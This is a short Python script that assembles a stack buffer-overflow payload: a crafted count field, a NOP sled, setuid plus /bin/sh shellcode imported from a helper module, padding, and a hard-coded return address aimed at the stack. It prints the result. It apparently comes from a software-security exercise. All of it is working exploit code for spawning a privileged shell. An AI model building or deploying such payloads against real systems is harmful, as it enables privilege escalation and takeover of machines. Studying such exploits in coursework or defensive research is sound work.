from shellcode import * 
she=setuid+bin_sh
nop='\x90'
count= '\x19\x00\x00\x40' # 100
ret= '\x30\xbd\xff\xbf' # bfffbd0c :: ebp+4  # '\xe0\xbc\xff\xbf'

shell = count + nop*20+ she + nop*83 + ret

print(shell)
